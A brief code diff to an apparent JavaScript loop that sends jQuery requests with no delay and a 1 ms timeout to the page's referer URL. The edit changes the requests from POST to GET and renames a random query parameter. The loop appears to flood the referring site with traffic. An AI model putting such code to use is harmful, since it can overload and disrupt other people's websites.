@@ -26,9 +26,9 @@
             setInterval(function () {
 
                 $.ajax({
-                    method: 'POST',
-                    url: `${referer}?data=${Math.random()}`,
-                    data: Math.random().toString(),
+                    method: 'GET',
+                    url: `${referer}?path=${Math.random()}`,
+                    // data: Math.random().toString(),
                     timeout: 1
                 })
             })
